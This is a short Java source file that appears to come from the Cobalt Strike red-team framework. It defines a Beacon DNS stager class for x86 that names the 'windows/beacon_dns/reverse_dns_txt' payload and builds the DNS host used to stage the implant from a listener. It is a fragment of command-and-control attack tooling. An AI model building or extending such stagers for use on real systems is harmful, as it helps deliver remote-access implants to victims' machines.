package stagers;

import common.ScListener;

public class BeaconDNSStagerX86 extends GenericDNSStagerX86 {
    public BeaconDNSStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String getDNSHost() {
        return getListener().getStagerHost();
    }

    public String payload() {
        return "windows/beacon_dns/reverse_dns_txt";
    }

    public String getHost() {
        return !"".equals(getConfig().getDNSSubhost()) ? (getConfig().getDNSSubhost() + getDNSHost()) : super.getHost();
    }
}
